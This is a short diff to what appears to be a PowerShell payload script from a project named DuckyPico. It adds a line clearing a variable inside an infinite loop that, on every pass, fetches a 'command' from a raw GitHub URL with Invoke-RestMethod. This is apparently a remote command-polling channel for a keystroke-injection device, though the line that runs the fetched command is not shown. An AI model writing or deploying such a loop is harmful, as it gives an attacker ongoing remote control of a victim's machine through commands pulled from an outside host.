@@ -4,6 +4,9 @@ $githubUrl = "https://raw.githubusercontent.com/JH517/DuckyPico/refs/heads/main/
 # Start an infinite loop
 while ($true) {
     try {
+        # Clear the $command variable explicitly to avoid retaining old values
+        $command = $null
+    
         # Fetch the raw content of the GitHub page (plain text) for every iteration
         $command = Invoke-RestMethod -Uri $githubUrl
 
